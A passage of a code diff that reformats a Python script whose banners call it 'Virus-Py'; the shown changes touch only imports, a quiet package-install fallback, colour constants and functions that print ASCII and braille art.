@@ -1,26 +1,30 @@
 import inspect
 import os, sys
 from time import sleep
-import subprocess,random
+import subprocess, random
 import hashlib
+
 R = ('\033[31m')
 W = ("\033[97m")
 G = ('\033[92m')
 BLUE = ("\033[34m")
 LIGHTGREEN_EX = ('\033[92m')
 try:
-    import pyfiglet,webbrowser,requests
-    from termcolor import colored
+  import pyfiglet, webbrowser, requests
+  from termcolor import colored
 except ModuleNotFoundError:
-	import subprocess	
-	def install_packages(*package_names):
-	    for package_name in package_names:
-	        subprocess.call(['pip', 'install', package_name, '--quiet'])	    
-	install_packages('requests', 'webbrowser', 'pyfiglet', 'wget','termcolor')
+  import subprocess
+
+  def install_packages(*package_names):
+    for package_name in package_names:
+      subprocess.call(['pip', 'install', package_name, '--quiet'])
+
+  install_packages('requests', 'webbrowser', 'pyfiglet', 'wget', 'termcolor')
 finally:
-	import pyfiglet,webbrowser,requests
-	from termcolor import colored
-asci =('''
+  import pyfiglet, webbrowser, requests
+  from termcolor import colored
+
+asci = ('''
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀
@@ -45,7 +49,7 @@ asci =('''
 ⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡿⠛⣠⣟⣁⠤⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀
 ⠀⠀⠀⠀⠀⠀⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢸⠿⠃⠀
 ⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣆⠀⠀⠀⠀⠀⠀''','''⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢲⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣆⠀⠀⠀⠀⠀⠀''', '''⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢲⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⠂⢉⠤⠐⠋⠈⠡⡈⠉⠐⠠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⢀⡀⢠⣤⠔⠁⢀⠀⠀⠀⠀⠀⠀⠀⠈⢢⠀⠀⠈⠱⡤⣤⠄⣀⠀⠀⠀⠀⠀
@@ -65,7 +69,8 @@ asci =('''
 ⠀⢢⠀⠑⢵⣧⡀⠀⠀⡿⠳⠂⠉⠀⠀⠀⠀⠀⠀⠀⠁⢺⡀⠀⠀⢀⢠⣮⠃⢀⠆⡰⠀
 ⠀⠀⠑⠄⣀⠙⡭⠢⢀⡀⠀⠁⠄⣀⣀⠀⢀⣀⣀⣀⡠⠂⢃⡀⠔⠱⡞⢁⠄⣁⠔⠁⠀
 ⠀⠀⠀⠀⠀⢠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠉⠁
-⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀''','''⠤⠤⠤⠤⠤⠤⢤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀''',
+        '''⠤⠤⠤⠤⠤⠤⢤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠤⠶⠶⠶⠦⠤⠤⠤⠤⠤⢤⣤⣀⣀⣀⣀⣀⣀⠀
 ⠀⠀⠀⠀⢀⠄⢂⣠⣭⣭⣕⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠀⠀⠀⠤⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉
 ⠀⠀⢀⠜⣳⣾⡿⠛⣿⣿⣿⣦⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣍⣀⣦⠦⠄⣀⠀⡀
@@ -77,7 +82,8 @@ asci =('''
 ⠀⠀⠀⠀⠸⣇⡀⠀⠑⢄⠀⠀⠀⡠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢖⠠⠤⠤⠔⠙⠻⠿⠋⠱⡑⢄⠀⢠⠟
 ⠀⠀⠀⠀⠀⠀⠈⠉⠒⠒⠻⠶⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠡⢀⡵⠃
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠦⣀⠀⠀⠀⠀⠀⢀⣤⡟⠉
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠙⠛⠓⠒⠲⠿⢍⡀''','''⠀⠀⠀⠀⢀⡠⠤⠔⢲⢶⡖⠒⠤⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠙⠛⠓⠒⠲⠿⢍⡀''',
+        '''⠀⠀⠀⠀⢀⡠⠤⠔⢲⢶⡖⠒⠤⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⣠⡚⠁⢀⠀⠀⢄⢻⣿⠀⠀⠀⡙⣷⢤⡀⠀⠀⠀⠀⠀⠀
 ⠀⡜⢱⣇⠀⣧⢣⡀⠀⡀⢻⡇⠀⡄⢰⣿⣷⡌⣢⡀⠀⠀⠀⠀
 ⠸⡇⡎⡿⣆⠹⣷⡹⣄⠙⣽⣿⢸⣧⣼⣿⣿⣿⣶⣼⣆⠀⠀⠀
@@ -91,7 +97,7 @@ asci =('''
 ⠀⠀⢿⢸⣿⣿⣿⣿⣿⡇⠀⢠⣿⡏⢿⣿⣿⡇⢸⣇⠇⠀⠀⠀
 ⠀⠀⢸⡏⣿⣿⣿⠟⠋⣀⠠⣾⣿⠡⠀⢉⢟⠷⢼⣿⣿⠀⠀⠀
 ⠀⠀⠈⣷⡏⡱⠁⠀⠊⠀⠀⣿⣏⣀⡠⢣⠃⠀⠀⢹⣿⡄⠀⠀
-⠀⠀⠘⢼⣿⠀⢠⣤⣀⠉⣹⡿⠀⠁⠀⡸⠀⠀⠀⠈⣿⡇''','''⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢀⢠⣤⣤⣤⠀⠀⠀⠀⠀
+⠀⠀⠘⢼⣿⠀⢠⣤⣀⠉⣹⡿⠀⠁⠀⡸⠀⠀⠀⠈⣿⡇''', '''⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢀⢠⣤⣤⣤⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⣶⡏⠀⠀⠈⠉⠙⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣼⢶⡶⣦⣤⡀⠀⣠⣤⠶⠎⠉⠉⠀⠀⢮⣷⡆⠀⠀⠀
 ⠀⠀⠀⢀⣼⢻⠀⠀⠀⠀⠀⠀⠀⠀⠻⠦⠤⠶⠛⠛⠛⠛⢻⣿⡻⣜⢧⡻⣝⡞⣿⡟⠃⠀⠀⠀⠀⠀⠀⠀⢠⢂⡿⣀⠀⠀
 ⠀⠀⠀⢸⣇⢺⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣸⣿⢳⡝⣮⣳⣝⡾⡼⣭⣻⣇⢀⠀⠀⠀⠀⠀⠀⠰⡨⠔⣿⠀⠀
@@ -118,7 +124,7 @@ asci =('''
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠄⠀⠀⠀⠀⠀⠙⠀⣀⠀⢀⡘⠉⠀⠀⠀⠀⠀⢰⣿⠞⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⢰⠂⣿⢂⡆⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀⠈⣜⣿⡂⠆⠀⠀⠀⠀⠀⠀⣾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠦⠶⠶⠴⠶⠾⠛⠃⠛⠻⠴⠶⠶⠶⠴⠞⠃''','''
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠦⠶⠶⠴⠶⠾⠛⠃⠛⠻⠴⠶⠶⠶⠴⠞⠃''', '''
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡤⠶⠒⠒⠒⠒⠒⠒⠶⠦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣄⠀⠀⢀⣴⠞⠋⠉⢀⣀⣤⡤⠤⠤⠤⠤⢤⣤⣀⡀⠈⠙⠳⢦⣄⢀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢻⣀⡴⠋⢀⣤⠶⢚⣩⣥⠴⠖⠒⠒⠒⠲⠶⢦⣌⣙⠳⢦⣀⠀⢈⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -154,7 +160,7 @@ asci =('''
 ⣿⣿⣿⣿⣿⣧⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⡿⢟⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⣼⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
 ⣿⣿⣿⣿⣿⣿⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠀⠸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢸⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⡇⠀⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀
 ⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⢀⣀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀
-⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣤⣧⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣤⣤⣶⣮⣥⣤⣽⡆⠀⠀⠀⠀⠀⠀⠀⠀⠸⢸⡟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣥⣼⣿⣿⣿⣿⣿⣿⣿⣿⡀''','''
+⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣤⣧⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣤⣤⣶⣮⣥⣤⣽⡆⠀⠀⠀⠀⠀⠀⠀⠀⠸⢸⡟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣥⣼⣿⣿⣿⣿⣿⣿⣿⣿⡀''', '''
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣶⣾⣿⣿⣿⣿⣷⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣾⣿⣿⣿⣿⣷⣶⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⢀⣠⡴⠾⠟⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠷⢦⣄⡀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠘⠋⠁⠀⠀⢀⣀⣤⣶⣖⣒⣒⡲⠶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⢖⣒⣒⣲⣶⣤⣀⡀⠀⠀⠈⠙⠂⠀⠀⠀⠀
@@ -166,7 +172,7 @@ asci =('''
 ⠀⠀⠀⠀⠀⠀⠻⣆⠀⢹⣿⠟⢿⣿⣦⣤⣤⣴⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡿⢷⣤⣤⣤⣴⣿⣿⣿⣿⡇⠀⣰⠟⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠙⢀⣀⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠁⠀⣻⣿⣿⣿⣿⣿⣿⠏⠀⠘⠃⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡈⠻⠿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⢿⣿⣿⣿⠿⠛⢁⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠛⣶⣦⣤⣤⣤⡤⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢤⣤⣤⣤⣶⣾⠛⠓''','''
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠛⣶⣦⣤⣤⣤⡤⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢤⣤⣤⣤⣶⣾⠛⠓''', '''
 ⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⡠⢴⣴⣾⣿⡿⠓⡠⠀⠀⠀⠀⠠⢄⠁⢀⠀⠀
 ⠀⠀⠀⠀⠀⠳⣽⡽⠀⠀⡠⢊⣴⣿⣿⣿⣡⠖⠁⣀⡤⢖⠟⠁⡠⠀⡙⢿⣷⣄
 ⠀⠀⠐⡀⠀⠀⠀⠀⢠⣾⣿⣿⢽⣿⣿⣿⣥⠖⣻⣯⡾⠃⠀⡔⡀⠀⣷⢸⢿⣿
@@ -185,11 +191,13 @@ asci =('''
 ⠀⠀⠀⠆⠁⠃⠀⠀⠈⠒⠒⠊⣸⠚⠁⠀⠀⠀⠀⠀⠀⠀⡜⠁⠀⠀⠀⠀⠈⠚
 ⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⢀⠋⢆⠀⠀⠀⠀⠀⠀⠀⡘⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠒⠂⠀⠀⠐⠋''')
+
+
 def ascii():
-	G = ('\033[92m')
-	R = ('\033[31m')
-	print('''\033[31m
-        	uuuuuuu
+  G = ('\033[92m')
+  R = ('\033[31m')
+  print('''\033[31m
+          uuuuuuu
              uu$$$$$$$$$$$uu
           uu$$$$$$$$$$$$$$$$$uu
          u$$$$$$$$$$$$$$$$$$$$$u
@@ -206,7 +214,7 @@ def ascii():
              u$"$"$"$"$"$"$u
   uuu        $$u$ $ $ $ $u$$       uuu
  u$$$$        $$$$$u$u$u$$$       u$$$$
-  $$$$$uu      "$$$$$$$$$"     uu$$$$$$      '''+G+'''Done!!!'''+R+'''
+  $$$$$uu      "$$$$$$$$$"     uu$$$$$$      ''' + G + '''Done!!!''' + R + '''
 u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
 $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
  """      ""$$$$$$$$$$$uu ""$"""
@@ -215,21 +223,25 @@ $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
   $$$$$$$$$$""""           ""$$$$$$$$$$$"
    "$$$$$"                      ""$$$$""
      $$$"                         $$$$"''')
+
+
 asci_name = random.choice(asci)
 W = ("\033[97m")
-g='\033[1;32m'
-p='\033[1;35m'
-cyan='\033[1;36m'
-green='\033[1;32m'
-red='\033[1;31m'
-yellow='\033[1;33m'
-blue='\033[1;34m'
-purple='\033[1;35m'
-reset='\033[0m'
-y='\033[1;33m'
+g = '\033[1;32m'
+p = '\033[1;35m'
+cyan = '\033[1;36m'
+green = '\033[1;32m'
+red = '\033[1;31m'
+yellow = '\033[1;33m'
+blue = '\033[1;34m'
+purple = '\033[1;35m'
+reset = '\033[0m'
+y = '\033[1;33m'
 import time
+
+
 def sem_1():
-	print('''
+  print('''
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⣶⣶⡆⠀⠀⠀⠀⢰⣶⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -259,942 +271,1567 @@ def sem_1():
 ⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣷⣶⣶⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣶⣶⣾⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠿⠿⠿⠿⠿⠿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠛⠛⠋⠉⠀
-'''+red+'''            __     ___                 '''+W+'''
-'''+red+'''            \ \   / (_)_ __ _   _ ___   _ __  _   _'''+W+'''
-'''+red+'''             \ \ / /| | '__| | | / __| | '_ \| | | |'''+W+'''
-'''+red+'''              \ V / | | |  | |_| \__ \_| |_) | |_| |'''+W+'''
-'''+red+'''               \_/  |_|_|   \__,_|___(_) .__/ \__, |'''+W+'''
-'''+red+'''                                       |_|    |___/'''+W+'''
+''' + red + '''            __     ___                 ''' + W + '''
+''' + red + '''            \ \   / (_)_ __ _   _ ___   _ __  _   _''' + W + '''
+''' + red + '''             \ \ / /| | '__| | | / __| | '_ \| | | |''' + W +
+        '''
+''' + red + '''              \ V / | | |  | |_| \__ \_| |_) | |_| |''' + W +
+        '''
+''' + red + '''               \_/  |_|_|   \__,_|___(_) .__/ \__, |''' + W +
+        '''
+''' + red + '''                                       |_|    |___/''' + W + '''
 ''')
+
+
 def sem_2():
- print(cyan+'''         `://-::.`                          `-++syhs` ''')
- time.sleep( 0.01)
- print(cyan+'''          dNNNNNNNds-                      `odNNmddmm`              ''')
- time.sleep( 0.01)
- print(cyan+'''          /mmmmdddmNdo-                   :hmdhhddmN+               ''')
- time.sleep( 0.01)
- print(cyan+'''           /Nmmdddhhho++`     ''' +red+'Virus-Py'+cyan+'''     /hdhhhhhhdm-               ''')
- time.sleep( 0.01)
- print(cyan+'''            hmdhhhyho/s/o.              /ddhhyyyyyhm:               ''')
- time.sleep( 0.01)
- print(cyan+'''            omdyyyso/.-s/s.            .hhdyyyysssyho               ''')
- time.sleep( 0.01)
- print(cyan+'''            omdyyyys+-..o/s```..```.``.oddyyo+/:://oo`              ''')
- time.sleep( 0.01)
- print(cyan+'''            /mddysss+::-.+y/``..``...`.ymhhho/:.-/+s/`              ''')
- time.sleep( 0.01)
- print(cyan+'''            `+ddyyss/---.`sh.``-``...`.hdyyhssss+::::/++:`          ''')
- time.sleep( 0.01)
- print(cyan+'''          -+syyyyyyy:oo:..-y: `````..``dsyyyyhhh/--:+sdNNm:         ''') 
- time.sleep( 0.01)
- print(cyan+'''        .smmdhysosyy.-:...-+y//``  ``:-mdhhhyyysoshddmmNNNN/        ''')
- time.sleep( 0.01)
- print(cyan+'''        ymmdsyyyssso/::-:/+yNd/`     /dNNdyhhhhhshdmmmmmNMMm`       ''')
- time.sleep( 0.01)
- print(cyan+'''       +mmmhosyyyys::+shdmNNd:`.-    ::sdddhddddhhdmmmmmNMN/        ''')
- time.sleep( 0.01)
- print(cyan+'''       oNmmhyyyyhdhhhdhhs/+---``-` ``/.`-.:`:+odh+sydmNMNy-         ''')
- time.sleep( 0.01)
- print(cyan+'''     ``.+mmmmddmmdysmh//-.:--.:.-....:-.---..........:+/-`          ''')
- time.sleep( 0.01)
- print(cyan+'''       ..-ohNNNho::://::://+////::::::::::::-----.......``       ''')
- time.sleep( 0.01)
- print(cyan+'''        `...---------:::::::::::::------------.......````           ''')
- time.sleep( 0.01)
- print(cyan+'''           `````````````...........```````````````````              ''')
- time.sleep(0.01) 
+  print(cyan + '''         `://-::.`                          `-++syhs` ''')
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''          dNNNNNNNds-                      `odNNmddmm`              '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''          /mmmmdddmNdo-                   :hmdhhddmN+               '''
+  )
+  time.sleep(0.01)
+  print(cyan + '''           /Nmmdddhhho++`     ''' + red + 'Virus-Py' + cyan +
+        '''     /hdhhhhhhdm-               ''')
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''            hmdhhhyho/s/o.              /ddhhyyyyyhm:               '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''            omdyyyso/.-s/s.            .hhdyyyysssyho               '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''            omdyyyys+-..o/s```..```.``.oddyyo+/:://oo`              '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''            /mddysss+::-.+y/``..``...`.ymhhho/:.-/+s/`              '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''            `+ddyyss/---.`sh.``-``...`.hdyyhssss+::::/++:`          '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''          -+syyyyyyy:oo:..-y: `````..``dsyyyyhhh/--:+sdNNm:         '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''        .smmdhysosyy.-:...-+y//``  ``:-mdhhhyyysoshddmmNNNN/        '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''        ymmdsyyyssso/::-:/+yNd/`     /dNNdyhhhhhshdmmmmmNMMm`       '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''       +mmmhosyyyys::+shdmNNd:`.-    ::sdddhddddhhdmmmmmNMN/        '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''       oNmmhyyyyhdhhhdhhs/+---``-` ``/.`-.:`:+odh+sydmNMNy-         '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''     ``.+mmmmddmmdysmh//-.:--.:.-....:-.---..........:+/-`          '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''       ..-ohNNNho::://::://+////::::::::::::-----.......``       ''')
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''        `...---------:::::::::::::------------.......````           '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''           `````````````...........```````````````````              '''
+  )
+  time.sleep(0.01)
+
+
 def sem_3():
- 
- print(cyan+'''                                       .-.              ''')
- time.sleep(0.01)
- print(cyan+'''                                       : `-`        ''')
- time.sleep(0.01)
- print(cyan+'''                                     -o. .:/-           ''')                                  
- time.sleep(0.01)
- print(cyan+'''                                     -o   ``:/              ''')           
- time.sleep(0.01)
- print(cyan+'''                                    .++      .:             ''')
- time.sleep(0.01)
- print(cyan+'''                                     ./       .-.               ''')                          
- time.sleep(0.01)
- print(cyan+'''                         '''+red+'Virus-Py'+cyan+'''     o..   .  /- -                                     ''')
- time.sleep(0.01)
- print(cyan+'''                        `.`..-:-`    .sh+-.`:- :`:.                                        ''')
- time.sleep(0.01)
